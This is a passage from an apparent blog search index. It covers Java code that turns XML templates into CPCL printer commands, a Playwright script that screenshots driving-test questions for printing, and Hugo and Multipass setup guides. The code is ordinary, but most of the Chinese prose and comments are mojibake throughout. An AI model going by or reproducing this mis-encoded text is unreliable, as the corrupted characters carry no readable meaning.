EnumUtils.getEnum(TAG.class, elemName.toUpperCase()); if(elemEnum == null) { return; } switch (elemEnum) { case TEXT: cpclCommand.addCommand(printText(elem)); break; case IMAGE: cpclCommand.addCommand(printImage(elem)); break; case BARCODE: cpclCommand.addCommand(printBarcode(elem)); break; case LINE: cpclCommand.addCommand(printLine(elem)); break; case BOX: cpclCommand.addCommand(printBox(elem)); break; default: break; } } private void preHandle(CpclCommand cpclCommand, Element element) { int width = getIntValue(element.attributeValue(ATTR.WIDTH.getValue()), 0); int height = getIntValue(element.attributeValue(ATTR.HEIGHT.getValue()), 0); int copies = getIntValue(element.attributeValue(ATTR.COPIES.getValue()), 1); cpclCommand.init(width, height, copies); } private void afterHandle(CpclCommand cpclCommand) { cpclCommand.print(); } public CpclCommand printText(Element element) { Element parent = element.getParent(); String style = element.attributeValue(\u0026#34;style\u0026#34;); String[] split = style.split(\u0026#34;;\u0026#34;); CpclCommand cpclCommand = new CpclCommand(); CpclCommand.TEXT textCommand = getValue(EnumUtils.getEnum(CpclCommand.TEXT.class, element.attributeValue(ATTR.COMMAND.getValue())), CpclCommand.TEXT.TEXT); int x = getIntValue(parent.attributeValue(ATTR.LEFT.getValue()), 0); int y = getIntValue(parent.attributeValue(ATTR.TOP.getValue()), 0); String data = element.getText().trim(); int size = getIntValue(element.attributeValue(ATTR.FONT_SIZE.getValue()), 0); int gap = getIntValue(element.attributeValue(ATTR.GAP.getValue()), 0); int width = getIntValue(parent.attributeValue(ATTR.WIDTH.getValue()), 0); int height = getIntValue(parent.attributeValue(ATTR.HEIGHT.getValue()), 0); int blod = getIntValue(element.attributeValue(ATTR.FONT_WEIGHT.getValue()), 0); // æ”¾å¤§ int xMultiplication = getIntValue(element.attributeValue(ATTR.X_MULTIPLICATION.getValue()), 1); int yMultiplication = getIntValue(element.attributeValue(ATTR.Y_MULTIPLICATION.getValue()), 1); CpclCommand.FONT font = getValue(EnumUtils.getEnum(CpclCommand.FONT.class, element.attributeValue(ATTR.FONT.getValue())), CpclCommand.FONT.F24); boolean isCenter = false; for (int i = 0; i \u0026lt; split.length; i++) { String[] split1 = split[i].split(\u0026#34;:\u0026#34;); String key = split1[0]; String value = split1[1]; // å­—ä½“åŠ ç²— if (key.contains(\u0026#34;fontWeight\u0026#34;)) { if (\u0026#34;bold\u0026#34;.equals(value)) { blod = 1; } } // å­—ä½“å¤§å° else if (key.contains(\u0026#34;fontSize\u0026#34;)) { if (\u0026#34;auto\u0026#34;.equals(value)) { int nextY = cpclCommand.calcSimulateBlockNextY(textCommand, font, size, x, y, data, width, 2, 2, gap); if (nextY \u0026gt; y + height) { xMultiplication = 1; yMultiplication = 1; } else { xMultiplication = 2; yMultiplication = 2; } } else if (Integer.parseInt(value) \u0026gt; 14) { xMultiplication = 2; yMultiplication = 2; } else if (Integer.parseInt(value) \u0026lt;= 6) { font = CpclCommand.FONT.F55; } else { xMultiplication = 1; yMultiplication = 1; } } // å±…ä¸­ else if (key.contains(\u0026#34;align\u0026#34;)) { if (\u0026#34;center\u0026#34;.equals(value)) { isCenter = true; } } } // åŠ ç²— if (blod == 1) { cpclCommand.setBlod(true); } // æ”¾å¤§ if (xMultiplication \u0026gt; 1 \u0026amp;\u0026amp; yMultiplication \u0026gt; 1) { cpclCommand.setMag(xMultiplication, yMultiplication); } cpclCommand.addSimulateBlock(textCommand, font, size, x, y, data, width, xMultiplication, yMultiplication, gap, isCenter); // é‡ç½®å­—ä½“æ ·å¼ if (xMultiplication \u0026gt; 1 \u0026amp;\u0026amp; yMultiplication \u0026gt; 1) { cpclCommand.setMag(1, 1); } if (blod == 1) { cpclCommand.setBlod(false); } return cpclCommand; } @Override public CpclCommand printBarcode(Element element) { Element parent = element.getParent(); CpclCommand cpclCommand = new CpclCommand(); CpclCommand.BARCODE barcode = getValue(EnumUtils.getEnum(CpclCommand.BARCODE.class, element.attributeValue(ATTR.COMMAND.getValue())), CpclCommand.BARCODE.BARCODE); CpclCommand.CODE_TYPE codeType = getValue(EnumUtils.getEnum(CpclCommand.CODE_TYPE.class, element.attributeValue(ATTR.CODE_TYPE.getValue())), CpclCommand.CODE_TYPE.CODE128); String type = getValue(element.attributeValue(ATTR.TYPE.getValue()), \u0026#34;\u0026#34;); int x = getIntValue(parent.attributeValue(ATTR.LEFT.getValue()), 0); int y = getIntValue(parent.attributeValue(ATTR.TOP.getValue()), 0); int width = getIntValue(parent.attributeValue(ATTR.WIDTH.getValue()), 0); int height = getIntValue(parent.attributeValue(ATTR.HEIGHT.getValue()), 0); CpclCommand.RATIO ratio = CpclCommand.RATIO.R2; String data = StringUtil.valueOf(element.getText()).trim(); if (StringUtil.isBlank(data)) { data = StringUtil.valueOf(element.attributeValue(ATTR.VALUE.getValue())).trim(); } if (StringUtil.isBlank(data)) { return cpclCommand; } if (\u0026#34;qrcode\u0026#34;.equals(type)) { cpclCommand.qrCode(barcode, x, y, 2, 3, CpclCommand.EEC.LEVEL_M, data); } else { int cellWidth = (int) Math.floor(width / (ratio.getValue() * data.length() * 6)); int posX = x + (int) ((width - ratio.getValue() * data.length() * 6 * cellWidth) * 0.3); cpclCommand.barcode(barcode, codeType, cellWidth, ratio, height, posX, y, data); } return cpclCommand; } @Override public CpclCommand printImage(Element element) { Element parent = element.getParent(); CpclCommand cpclCommand = new CpclCommand(); int x = getIntValue(parent.attributeValue(ATTR.LEFT.getValue()), 0); int y = getIntValue(parent.attributeValue(ATTR.TOP.getValue()), 0); int width = 0; int height = 0; String src = element.attributeValue(ATTR.SRC.getValue()); BufferedImage image = null; try { if(src.startsWith(\u0026#34;data:image/png;base64,\u0026#34;)) { byte[] bytes = Base64.getDecoder().decode(src.substring(\u0026#34;data:image/png;base64,\u0026#34;.length())); ByteArrayInputStream is = new ByteArrayInputStream(bytes); image = ImageIO.read(is); is.close(); } else { image = ImgUtils.getImageFromUrl(src); } if(image == null) { return cpclCommand; } // æœªè®¾å®šå®½åº¦å€¼åˆ™æ ¹æ®é«˜åº¦åŒæ¯”ä¾‹è¿›è¡Œå‹ç¼© height = getIntValue(parent.attributeValue(ATTR.HEIGHT.getValue()), image.getHeight()); width = getIntValue(parent.attributeValue(ATTR.WIDTH.getValue()), image.getWidth()); // å‹ç¼©å›¾ç‰‡å¤§å° BufferedImage bitMap = new BufferedImage(width, height, BufferedImage.TYPE_BYTE_BINARY); bitMap.getGraphics().drawImage(image, 0, 0, width, height, null); bitMap.getGraphics().dispose(); cpclCommand.graphics(x, y, width, height, bitMap); bitMap.flush(); image.flush(); } catch (MalformedURLException e) { logger.error(\u0026#34;å›¾ç‰‡URLè§£æå¼‚å¸¸ï¼\u0026#34;, e); } catch (IOException e) { logger.error(\u0026#34;å›¾ç‰‡è¯»å–æˆ–ä¸‹è½½å¼‚å¸¸ï¼\u0026#34;, e); } finally { if (image != null) { image.getGraphics().dispose(); } } return cpclCommand; } @Override public CpclCommand printLine(Element element) { CpclCommand cpclCommand = new CpclCommand(); int x0 = getIntValue(element.attributeValue(ATTR.START_X.getValue()), 0); int y0 = getIntValue(element.attributeValue(ATTR.START_Y.getValue()), 0); int x1 = getIntValue(element.attributeValue(ATTR.END_X.getValue()), 0); int y1 = getIntValue(element.attributeValue(ATTR.END_Y.getValue()), 0); int width = getIntValue(element.attributeValue(ATTR.WIDTH.getValue()), 1); cpclCommand.line(x0, y0, x1, y1, width); return cpclCommand; } private int getIntValue(String str, int defaultValue) { return StringUtil.isNotBlank(str) ? (int)(Float.parseFloat(str) * 8) : defaultValue; } private \u0026lt;T\u0026gt; T getValue(T value, T defaultValue) { return value != null ? value : defaultValue; } private static BufferedImage getImageFromUrl(String url) throws IOException { BufferedImage bufferedImage = null; URL imgUrl = new URL(url); HttpURLConnection conn = (HttpURLConnection)imgUrl.openConnection(); conn.setConnectTimeout(5000); conn.setReadTimeout(5000); conn.connect(); if (HttpURLConnection.HTTP_OK == conn.getResponseCode()) { InputStream inputStream = conn.getInputStream(); bufferedImage = ImageIO.read(inputStream); } else { logger.error(\u0026#34;è·å–ç½‘ç»œå›¾ç‰‡å¤±è´¥,scr={}, code={}, msg={} \u0026#34;, url, conn.getResponseCode(), conn.getResponseMessage()); } conn.disconnect(); return bufferedImage; } /** * åˆå¹¶å­—èŠ‚æ•°ç»„ * @param bt1 * @param bt2 * @return */ public static byte[] byteMerger(byte[] bt1, byte[] bt2) { byte[] bt3 = new byte[bt1.length + bt2.length]; System.arraycopy(bt1, 0, bt3, 0, bt1.length); System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length); return bt3; } } æµ‹è¯•\r#\rSAXReader saxreader = new SAXReader(); Document dom = null; try { dom = saxreader.read(new ByteArrayInputStream(DemoConstnts.template_74.getBytes(\u0026#34;UTF-8\u0026#34;))); } catch (Exception e) { e.printStackTrace(); } Element rootEle = dom.getRootElement(); CpclPrinter cpclPrinter = new CpclPrinter(); byte[] cmd = cpclPrinter.wrapTemplate(rootEle); System.out.println(new String(cmd, \u0026#34;GB18030\u0026#34;)); å…¶ä»–é—®é¢˜\r#\rjava è°ƒç”¨ js é—®é¢˜\nç”±äºæ¨¡æ¿å¼•æ“æ˜¯jsè¯­è¨€ï¼Œxmlè§£ææˆCPCLæŒ‡ä»¤æ˜¯ä½¿ç”¨javaå†™çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨javaåº”ç”¨ä¸­è°ƒç”¨è¿™å¥—jsé€»è¾‘ã€‚\næ³¨æ„ï¼šè¿™é‡Œä¹Ÿå¯ä»¥æŠŠjavaè§£æCPCLæ”¹é€ æˆjsçš„å†™æ³•ï¼Œè¿™æ ·å°±ç›´æ¥èµ·ä¸ªnodejsé¡¹ç›®å°±å¯ä»¥ã€‚\nä¸Šé¢javaè°ƒç”¨jså¯èƒ½ä¼šæ€§èƒ½é—®é¢˜ï¼Œè¿˜æœ‰å…¶ä»–ä¸å¯é¢„ä¼°é—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ˜¯å•ç‹¬èµ·ä¸ªåº”ç”¨ï¼Œä¸èƒ½å› ä¸ºè¿™ä¸ªé—®é¢˜è€Œå½±å“åˆ°å…¶ä»–åŠŸèƒ½çš„æ­£å¸¸è¿è¡Œã€‚\nè°ƒç”¨ node åº”ç”¨\npublic class EjsRenderUtils { public static String ejsRender( String data) { ProcessBuilder processBuilder = new ProcessBuilder(); Random rand = new Random(); String tempFileName = System.currentTimeMillis() + \u0026#34;_\u0026#34; + rand.nextInt(1000); String dataTempFileName = \u0026#34;temp/\u0026#34; + tempFileName + \u0026#34;.json\u0026#34;; try { // æ¸…ç†ä¸€å°æ—¶å‰çš„ä¸´æ—¶æ–‡ä»¶ File tempDir = new File(\u0026#34;temp/\u0026#34;); if (!tempDir.exists()) { tempDir.mkdirs(); } long oneHourAgo = System.currentTimeMillis() - (1000 * 60 * 60); if (tempDir.listFiles() != null) { for (File file : tempDir.listFiles()) { if (file.lastModified() \u0026lt; oneHourAgo) { // Delete the file if it\u0026#39;s older than one hour file.delete(); } } } // å°†å‚æ•°å†™å…¥ä¸´æ—¶æ–‡ä»¶ File dataTempFile = new File(dataTempFileName); Files.write(dataTempFile.toPath(), data.getBytes(), StandardOpenOption.CREATE); } catch(IOException e) { e.printStackTrace(); } processBuilder.command(\u0026#34;node\u0026#34;, \u0026#34;script/ejsRender.js\u0026#34;, tempFileName); StringBuilder output = new StringBuilder(); try { Process process = processBuilder.start(); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line).append(\u0026#34;\\n\u0026#34;); } int exitCode = process.waitFor(); System.out.println(\u0026#34;\\nExited with error code : \u0026#34; + exitCode); } catch (IOException e) { e.printStackTrace(); } catch (InterruptedException e) { e.printStackTrace(); } // Return the output from the script return output.toString().trim(); } } æœ€åæ•´åˆèµ·æ¥å°±æ˜¯\n// è·å–æ¨¡æ¿å†…å®¹ String xmlTemplate = EjsRenderUtils.ejsRender(...); // æŠŠxmlæ¨¡æ¿è½¬æ¢æˆdocument Document templateDom = null; try { SAXReader saxreader = new SAXReader(); templateDom = saxreader.read(new ByteArrayInputStream(xmlTemplate.getBytes(StandardCharsets.UTF_8))); } catch (Exception e) { logger.error(\u0026#34;SAXReader.readè½¬æ¢é”™è¯¯, {}\u0026#34;, e.getMessage()); logger.error(\u0026#34;xmlè§£æåçš„ç»“æœ: {}\u0026#34;, xmlTemplate); } // è§£ææŒ‡ä»¤ Element rootEle = templateDom.getRootElement(); CpclPrinter cpclPrinter = new CpclPrinter(); byte[] cmd = cpclPrinter.wrapTemplate(rootEle); æ•´ä½“å†…å®¹ç»“æŸï¼\n"},{"id":12,"href":"/posts/%E4%BD%BF%E7%94%A8playwright%E6%88%AA%E5%9B%BE%E9%A9%BE%E7%85%A7%E9%A2%98%E7%9B%AE/","title":"ä½¿ç”¨playwrightæˆªå›¾é©¾ç…§é¢˜ç›®","section":"æˆ‘çš„åšå®¢","content":"\rç›®çš„\r#\rç›®å‰ç§‘ç›®ä¸€çš„é¢˜ç›®åªæœ‰åœ¨çº¿ç‰ˆæœ¬ï¼Œå¯¹äºé‚£äº›éœ€è¦å¯¼å‡ºpdfç‰ˆï¼Œæ‰“å°å‡ºæ¥ç»ƒä¹ çš„ï¼Œæ²¡æœ‰åŠæ³•å¯ä»¥ç›´æ¥å¯¼å‡ºpdfï¼Œå› æ­¤éœ€è¦æˆªå›¾ ç§‘ç›®ä¸€é¢˜ç›®ï¼Œæ•´ç†æˆpdfï¼Œä»¥ä¾›æ‰“å°ã€‚\nè¿™é‡Œå€ŸåŠ©Playwrightå·¥å…·ï¼Œæˆªå›¾å‡ºé¢˜ç›®ï¼Œç„¶åå†æ•´ç†æˆpdfã€‚\nPlaywrightä»‹ç»\r#\rPlaywrightæ˜¯ä¸€ä¸ªå¼ºå¤§çš„Pythonåº“ï¼Œä»…ç”¨ä¸€ä¸ªAPIå³å¯è‡ªåŠ¨æ‰§è¡ŒChromiumã€Firefoxã€WebKitç­‰ä¸»æµæµè§ˆå™¨è‡ªåŠ¨åŒ–æ“ä½œï¼Œå¹¶åŒæ—¶æ”¯æŒä»¥æ— å¤´æ¨¡å¼ã€æœ‰å¤´æ¨¡å¼è¿è¡Œã€‚\nPlaywrightä¹Ÿæ˜¯ä¸€æ¬¾Webç«¯åˆ°ç«¯æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥åšè‡ªåŠ¨åŒ–æµ‹è¯•ã€‚\nPlaywright å®‰è£…\r#\rpip3 install playwright å®‰è£…ä¸»æµçš„æµè§ˆå™¨é©±åŠ¨\r#\rplaywright install æ³¨æ„ï¼šå®‰è£…è¿‡ç¨‹éœ€è¦æ—¶é—´ï¼Œæ…¢æ…¢ç­‰å§ï½ï½\næ­¥éª¤\r#\r1ã€è§‚å¯Ÿé¡µé¢å…ƒç´ ï¼Œå¦‚ä½•å¯ä»¥æˆªå‡ºä¸€å¼ åŒ…å«è¯¦ç»†ä¿¡æ¯çš„å›¾ç‰‡ã€‚\n2ã€æŸ¥æ‰¾æˆªå›¾çš„èŒƒå›´ï¼Œè¾¾åˆ°å®Œç¾è¾¹ç•Œã€‚\n3ã€è¿›è¡Œä¸‹ä¸€é¡µè‡ªåŠ¨åŒ–å¤„ç†ã€‚\næ²¡æœ‰è¯¦ç»†æ­¥éª¤ï¼Œçœ‹ä»£ç å§ï½ï½\næ•´ä½“ä»£ç \r#\r1ã€æŠŠå…¨éƒ¨é¢˜ç›®å’Œè¯¦è§£æˆªå›¾ä¸‹æ¥\nimport os.path from playwright.sync_api import sync_playwright # å›¾ç‰‡ä¿å­˜è·¯å¾„ path = \u0026#39;/Users/yuanmoc/Documents/py-workspace/test/timu\u0026#39; def run(playwright): # ä½¿ç”¨chromeæ¨¡æ‹Ÿæµè§ˆå™¨ browser = playwright.chromium.launch(headless=False) # çª—ä½“å¤§å°ï¼Œè¿˜å¯ä»¥è®¾ç½®å¤´ä¿¡æ¯ç­‰ #context = browser.new_context(viewport = {\u0026#39;width\u0026#39;: 375, \u0026#39;height\u0026#39;: 812}) context = browser.new_context() # æ–°å»ºpage page = context.new_page() # æ‰“å¼€é¡µé¢ page.goto(\u0026#34;https://www.jiakaobaodian.com/mnks/exercise/0-car-kemu1-guangzhou.html?id=800500\u0026#34;) # é€‰æ‹©å…ƒç´ ï¼Œç‚¹å‡»ç¦æ­¢è‡ªåŠ¨è·³è½¬ä¸‹ä¸€é¡µï¼ˆå› ä¸ºè¿™é‡Œéœ€è¦æˆªå›¾å…ˆï¼‰ page.wait_for_selector(\u0026#34;input.checkbox-next\u0026#34;).click() # é€‰æ‹©å…ƒç´ ï¼Œç‚¹å‡»æ˜¾ç¤ºè¯¦è§£ page.wait_for_selector(\u0026#34;text=\u0026#39;æ˜¾ç¤ºè¯¦è§£\u0026#39;\u0026#34;).click() # å¤„ç†ç¬¬ä¸€é¡µ handlerPage(page, 1) for i in range(2, 2285): # ç‚¹å‡»åˆ°ä¸‹ä¸€é¡µ page.wait_for_selector(\u0026#34;text=\u0026#39;ä¸‹ä¸€é¢˜\u0026#39;\u0026#34;).click() # å¤„ç†ä¸‹ä¸€é¡µ printPage(page, i) # å…³é—­èµ„æº page.close() context.close() browser.close() def handlerPage(page, num): # é€‰æ‹©ç­”æ¡ˆï¼Œè®©å…¶æ˜¾ç¤ºå‡ºæ­£ç¡®ç­”æ¡ˆï¼Œä»¥ä¾›æŸ¥çœ‹ page.click(\u0026#34;[ref=\\\u0026#34;answerclick\\\u0026#34;]:last-child\u0026#34;) # è¿™é‡Œéœ€è¦å…ˆç­‰å¾…ä¸€äº›æ—¶é—´ï¼Œè®©é¡µé¢æ¸²æŸ“å®Œæˆï¼Œä¸ç„¶ä¸‹é¢çš„å…ƒç´ æ— æ³•è¿›è¡Œå®šä½ä¸appendChild page.wait_for_timeout(300) # é€‰æ‹©é¢˜ç›®å…ƒç´  detail = page.wait_for_selector(\u0026#39;#ComQuestionDetail_qundefined\u0026#39;).as_element() # é€‰æ‹©è¯¦è§£å…ƒç´  xiangjie = page.wait_for_selector(\u0026#39;.xiangjie \u0026gt;\u0026gt; .content\u0026#39;).as_element() # æŠŠè¯¦è§£æ’å…¥åˆ°é¢˜ç›®ç­”æ¡ˆåé¢ page.evaluate(\u0026#39;\u0026#39;\u0026#39;([detail, xiangjie]) =\u0026gt; { detail.appendChild(document.createElement(\u0026#34;br\u0026#34;)); detail.appendChild(xiangjie); }\u0026#39;\u0026#39;\u0026#39;, [detail, xiangjie]) # åˆ›å»ºä¿å­˜å›¾ç‰‡çš„ç›®å½• if not os.path.exists(path): os.mkdir(path) # é€‰æ‹©å…ƒç´ èŒƒå›´ï¼Œå¹¶æˆªå›¾ï¼Œä¿å­˜ page.locator(\u0026#34;div.com-mnks-question-detail\u0026#34;).screenshot(path=path + \u0026#34;/\u0026#34;+str(num)+\u0026#34;.png\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: with sync_playwright() as playwright: run(playwright) 2ã€æŠŠå›¾ç‰‡æ‹¼æ¥æˆA4çº¸å·®ä¸å¤šå¤§å°ï¼Œæ–¹ä¾¿æ‰“å°\néœ€è¦å®‰è£… pip3 install Pillow\nfrom PIL import Image import os input_folder = \u0026#39;/Users/yuanmoc/Documents/py-workspace/test/timu/\u0026#39; output_folder = \u0026#39;/Users/yuanmoc/Documents/py-workspace/test/timu1/\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: if not os.path.exists(output_folder): os.mkdir(output_folder) # 14å¼ å›¾ç‰‡æ‹¼æˆä¸€é¡µ for i in range(1, 2284, 14): # ä¸€å¼ å›¾ç‰‡å¤§å°æ˜¯ 860 x 335 # åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼ˆ860 * 2 + 2ï¼‰ x ï¼ˆ335 * 7ï¼‰åƒç´ å¤§å°çš„ç™½è‰²èƒŒæ™¯å›¾åƒ new_image = Image.new(\u0026#39;RGB\u0026#39;, (860 * 2 + 2, 335 * 7), \u0026#39;white\u0026#39;) # å°†å››ä¸ªå›¾åƒç²˜è´´åˆ°æ–°å›¾åƒçš„æ­£ç¡®ä½ç½® new_image.paste(Image.open(input_folder+str(i)+\u0026#39;.png\u0026#39;), (0, 0)) new_image.paste(Image.open(input_folder+str(i+1)+\u0026#39;.png\u0026#39;), (862, 0)) new_image.paste(Image.open(input_folder + str(i + 2) + \u0026#39;.png\u0026#39;), (0, 335)) new_image.paste(Image.open(input_folder + str(i + 3) + \u0026#39;.png\u0026#39;), (862, 335)) new_image.paste(Image.open(input_folder + str(i + 4) + \u0026#39;.png\u0026#39;), (0, 335*2)) new_image.paste(Image.open(input_folder + str(i + 5) + \u0026#39;.png\u0026#39;), (862, 335*2)) new_image.paste(Image.open(input_folder + str(i + 6) + \u0026#39;.png\u0026#39;), (0, 335*3)) new_image.paste(Image.open(input_folder + str(i + 7) + \u0026#39;.png\u0026#39;), (862, 335*3)) new_image.paste(Image.open(input_folder + str(i + 8) + \u0026#39;.png\u0026#39;), (0, 335*4)) new_image.paste(Image.open(input_folder + str(i + 9) + \u0026#39;.png\u0026#39;), (862, 335*4)) new_image.paste(Image.open(input_folder + str(i + 10) + \u0026#39;.png\u0026#39;), (0, 335*5)) new_image.paste(Image.open(input_folder + str(i + 11) + \u0026#39;.png\u0026#39;), (862, 335*5)) new_image.paste(Image.open(input_folder + str(i + 12) + \u0026#39;.png\u0026#39;), (0, 335*6)) new_image.paste(Image.open(input_folder + str(i + 13) + \u0026#39;.png\u0026#39;), (862, 335*6)) new_image.save(output_folder + str(i)+\u0026#39;-\u0026#39;+str(i+13)+\u0026#39;.png\u0026#39;) "},{"id":13,"href":"/posts/%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","title":"ä½¿ç”¨hugoæ­å»ºåšå®¢","section":"æˆ‘çš„åšå®¢","content":"åœ¨ MAC M1 PRO ä¸Šå®‰è£…hugoå¹¶æ­å»ºåšå®¢\nå®‰è£…hugo\r#\r(å¦‚æœæ˜¯å…¶ä»–æœºå™¨ï¼Œè¯·æŒ‰ç…§å®˜ç½‘å®‰è£…æ•™ç¨‹\rç‚¹å‡»ç›´è¾¾åœ°å€)\nbrew install hugo æŸ¥çœ‹ç‰ˆæœ¬å·\r#\rhugo version åˆ›å»ºç«™ç‚¹\r#\rhugo new site myblog ç›®å½•ç»“æ„\nhugo-book â”œâ”€â”€ archetypes å†…å®¹æ¨¡ç‰ˆç›®å½• â”‚ â””â”€â”€ default.md æ¨¡ç‰ˆæ–‡ä»¶ â”œâ”€â”€ config.toml é…ç½®æ–‡ä»¶(ä¹Ÿå¯ä»¥æ˜¯config.yaml) â”œâ”€â”€ content å†…å®¹ç›®å½• â”œâ”€â”€ data æ•°æ®ç›®å½• â”œâ”€â”€ layouts ç½‘ç«™æ¨¡ç‰ˆç›®å½• â”œâ”€â”€ static é™æ€æ–‡ä»¶ç›®å½• â””â”€â”€ themes ä¸»é¢˜ç›®å½• æ·»åŠ æ¨¡æ¿\r#\rè¿™é‡Œä½¿ç”¨çš„æ˜¯hugo-bookï¼Œå¯ä»¥åœ¨å®˜ç½‘æŸ¥æ‰¾åˆé€‚çš„æ¨¡æ¿\rç‚¹å‡»ç›´è¾¾\ngit clone https://github.com/alex-shpak/hugo-book.git themes/hugo-book æŠŠé»˜è®¤æ¨¡æ¿çš„æ¨¡æ¿å†…å®¹å¤åˆ¶å‡ºæ¥å¹¶è¿è¡Œæµ‹è¯•\ncp themes/hugo-book/exampleSite/* ./ # åˆ é™¤å…¶ä»–å›½é™…åŒ–å†…å®¹ï¼Œå°±ç•™ä¸€ä¸ªä¸­æ–‡ rm -rf content content.bn content.ru content.zh mv content.en content # æµ‹è¯•æˆåŠŸåï¼Œå¯ä»¥æŠŠcontentä¸‹é¢çš„ç›®å½•åˆ é™¤ï¼Œå†™è‡ªå·±çš„å†…å®¹ ä¿®æ”¹é…ç½®\r#\rè¿™é‡Œä½¿ç”¨äº†config.yamlé…ç½®æ–‡ä»¶ï¼Œå…¶ä»–çš„åˆ é™¤,å¦‚ï¼šconfig.toml\n# å°±ä½¿ç”¨ä¸­æ–‡ï¼ŒæŠŠ languages è¿™å—ä¿®æ”¹æˆä»¥ä¸‹é…ç½® defaultContentLanguage: \u0026#34;zh\u0026#34; languages: zh: languageName: Chinese contentDir: content weight: 1 # å‘å¸ƒä½¿ç”¨ github pages çš„ /docs ï¼Œç”Ÿæˆçš„é™æ€æ–‡ä»¶ç›®å½•ä¿®æ”¹æˆ /docs # æ·»åŠ ä»¥ä¸‹é…ç½® publishDir: docs # baseURL ä¿®æ”¹æˆä½ é…ç½®çš„åœ°å€ï¼Œå¦‚æœæ˜¯github pages åˆšä¿®æ”¹æˆ \u0026lt;github-name\u0026gt;.github.io # title ç½‘ç«™çš„æ ‡é¢˜ è¿è¡Œhugo\r#\rhugo server è®¿é—® http://localhost:1313\nåˆ›å»ºæ–‡ç« \r#\rhugo new post/first.md å¤´éƒ¨æœ‰Front Matterï¼ˆå‰ç½®å…ƒæ•°æ®ï¼‰å‚æ•°\n--- title: \u0026#34;ä½¿ç”¨hugoæ­å»ºåšå®¢\u0026#34; weight: 1 draft: false # bookFlatSection: false # bookToc: true # bookHidden: false # bookCollapseSection: false # bookComments: false # bookSearchExclude: false --- titleï¼šæŒ‡å®šé¡µé¢æˆ–æ–‡ç« çš„æ ‡é¢˜ã€‚\nweightï¼šç”¨äºæ§åˆ¶é¡µé¢æˆ–æ–‡ç« çš„æ’åºé¡ºåºã€‚\ndraftï¼šæŒ‡å®šé¡µé¢æˆ–æ–‡ç« æ˜¯å¦ä¸ºè‰ç¨¿çŠ¶æ€ã€‚\nbookFlatSectionï¼šæŒ‡ç¤ºé¡µé¢æ˜¯å¦åº”ä¸ºæ‰å¹³ç›®å½•ç»“æ„ã€‚\nbookTocï¼šæŒ‡ç¤ºæ˜¯å¦åº”è‡ªåŠ¨ç”Ÿæˆé¡µé¢çš„ç›®å½•ç»“æ„ã€‚\nbookHiddenï¼šæŒ‡ç¤ºé¡µé¢æ˜¯å¦åº”åœ¨ç›®å½•ç»“æ„ä¸­éšè—ã€‚\nbookCollapseSectionï¼šæŒ‡ç¤ºç›®å½•ç»“æ„ä¸­çš„éƒ¨åˆ†æ˜¯å¦æŠ˜å ã€‚\nbookCommentsï¼šæŒ‡ç¤ºé¡µé¢æ˜¯å¦å…è®¸è¯„è®ºã€‚\nbookSearchExcludeï¼šæŒ‡ç¤ºé¡µé¢æ˜¯å¦åº”æ’é™¤åœ¨æœç´¢ç»“æœä¹‹å¤–ã€‚\néƒ¨ç½²\r#\råœ¨Githubä¸Šæ–°å»ºä»“åº“ xxx.github.io\nä¸€å®šæ˜¯ xxx.github.ioï¼Œxxx ä¸ºä½ çš„ Github ç”¨æˆ·å\nç”¨ hugo ç”Ÿæˆç½‘é¡µï¼Œæ‰˜ç®¡åˆ° GitHub ä»“åº“\nhugo -D # ä¼šç¼–è¯‘è‰ç¨¿å†…å®¹ æˆ–è€… hugo å°† myblog ç›®å½• push åˆ°åˆšåˆ›å»ºä»“åº“çš„ main åˆ†æ”¯\ngit init git add . git commit -m \u0026#34;message\u0026#34; git remote add origin https://github.com/xxx/xxx.github.io.git git push -u origin main åœ¨ä½ ä»“åº“ xxx.github.io ä¸‹ï¼ŒSettings-\u0026gt;Pages-\u0026gt;Branch æŠŠ/(root) ä¿®æ”¹æˆ /docs ä¿å­˜å³å¯ã€‚\nç„¶åå°±å¯ä»¥è®¿é—® xxx.github.io äº†ã€‚\nåˆ°æ­¤éƒ¨ç½²å®Œæˆâœ…ã€‚\næ·»åŠ è¯„è®ºåŠŸèƒ½\r#\rä½¿ç”¨ https://utteranc.es/ æ¥åšè¯„è®ºåŠŸèƒ½\n1ã€æ‰¾åˆ°comments.htmlæˆ–è€…åœ¨æ–‡ç« å†…å®¹ä¸‹é¢æ·»åŠ ä»¥ä¸‹å†…å®¹\n{{ if .Site.Params.utteranc.enable }} \u0026lt;script src=\u0026#34;https://utteranc.es/client.js\u0026#34; repo=\u0026#34;{{ .Site.Params.utteranc.repo }}\u0026#34; issue-term=\u0026#34;{{ .Site.Params.utteranc.issueTerm }}\u0026#34; theme=\u0026#34;{{ .Site.Params.utteranc.theme }}\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; async\u0026gt; \u0026lt;/script\u0026gt; {{ end }} 2ã€åˆ›å»ºä¸€ä¸ªå…¬å¼€çš„githubä»“åº“åœ¨å­˜å‚¨è¯„è®º\n3ã€å®‰è£…utterances\nå°±å®‰è£…åˆ°è‡ªå·±åˆšæ‰åˆ›å»ºçš„ä»“åº“å°±å¯ä»¥\nhttps://github.com/apps/utterances\n4ã€å¹¶é…ç½®å­˜å‚¨è¯„è®ºçš„githubä»“åº“ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯\nparams: utteranc: enable: true repo: \u0026#34;yuanmoc/blogtalks\u0026#34; # æ¢æˆè‡ªå·±å¾— issueTerm: \u0026#34;pathname\u0026#34; theme: \u0026#34;github-light\u0026#34; "},{"id":14,"href":"/posts/history/multipass%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8/","title":"Multipassè™šæ‹Ÿæœºä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"ä½¿ç”¨brewå®‰è£…\nbrew install --cask multipass å¯é€‰çš„å®‰è£…:(å›¾å½¢ç•Œé¢)\nbrew install --cask microsoft-remote-desktop åˆ›å»ºè™šæ‹Ÿæœº\nmultipass launch --name vm01 --mem 2G --disk 40G --cpus 2 \u0026ndash;name, -n, æŒ‡å‡ºè™šæ‹Ÿæœºå®ä¾‹çš„åç§°, 